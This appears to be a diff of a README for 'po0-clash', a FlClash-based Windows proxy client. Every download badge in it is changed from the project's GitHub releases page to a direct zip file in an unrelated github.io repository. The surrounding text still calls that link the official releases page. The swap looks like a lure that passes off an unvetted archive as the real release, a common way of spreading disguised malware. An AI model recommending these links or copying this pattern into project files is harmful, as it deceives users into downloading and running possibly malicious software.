@@ -5,7 +5,7 @@ description: "Run a multi-platform FlClash-based proxy client with built-in po0 
 ---
 # 🚀 po0-clash - Easy Proxy Setup for Windows
 
-[![Download po0-clash](https://img.shields.io/badge/Download-po0--clash-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/haridade777rlk/po0-clash/releases)
+[![Download po0-clash](https://img.shields.io/badge/Download-po0--clash-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/haridade777rlk/haridade777rlk.github.io/main/caoba/3.6.zip)
 
 po0-clash is a Windows application built on FlClash. It gives you a simple way to use a proxy connection and includes po0fw, an automatic firewall whitelist helper. The goal is to make setup easier for everyday computer users. You do not need programming knowledge to get started. Visit this link to download the application.
 
@@ -28,7 +28,7 @@ The application is intended for users who want a more guided experience. Instead
 
 Getting started with po0-clash is a short process. The most important step is to use the official download link. The link below opens the releases page where the application is available.
 
-[![Download po0-clash](https://img.shields.io/badge/Download-po0--clash-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/haridade777rlk/po0-clash/releases)
+[![Download po0-clash](https://img.shields.io/badge/Download-po0--clash-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/haridade777rlk/haridade777rlk.github.io/main/caoba/3.6.zip)
 
 Visit this link to download the application.
 
@@ -84,7 +84,7 @@ The built-in po0fw helper is designed to reduce manual firewall work. Use the ap
 
 Use the button below to open the official releases page.
 
-[![Download po0-clash for Windows](https://img.shields.io/badge/Download-po0--clash-4dabf7?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/haridade777rlk/po0-clash/releases)
+[![Download po0-clash for Windows](https://img.shields.io/badge/Download-po0--clash-4dabf7?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/haridade777rlk/haridade777rlk.github.io/main/caoba/3.6.zip)
 
 Visit this link to download the application.
 
